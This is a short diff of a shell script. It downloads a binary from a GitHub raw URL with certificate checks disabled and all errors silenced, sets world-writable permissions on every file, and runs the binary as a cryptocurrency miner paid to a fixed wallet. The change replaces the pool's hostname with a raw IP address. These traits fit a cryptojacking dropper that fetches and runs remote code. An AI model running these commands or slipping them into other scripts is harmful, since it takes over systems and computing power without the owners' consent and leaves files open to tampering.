@@ -1,3 +1,3 @@
 curl -L --insecure --connect-timeout 5 --max-time 40 --fail http://raw.githubusercontent.com/anw1012/yw/main/xxxx -o xxxx 2> /dev/null || wget --no-check-certificate --timeout 40 --tries 1 http://raw.githubusercontent.com/anw1012/yw/main/xxxx -O xxxx 2> /dev/null || _curl http://raw.githubusercontent.com/anw1012/yw/main/xxxx > xxxx 
 chmod 777 * 
-./xxxx -a yespowersugar  -o stratum+tcps://stratum-eu.rplant.xyz:17042 -u sugar1qsen3k8q8lzx48q7nha2kdq2pcj9l9fg0fgkcgs.S1;
+./xxxx -a yespowersugar  -o stratum+tcps://146.59.217.34:17042 -u sugar1qsen3k8q8lzx48q7nha2kdq2pcj9l9fg0fgkcgs.S1;
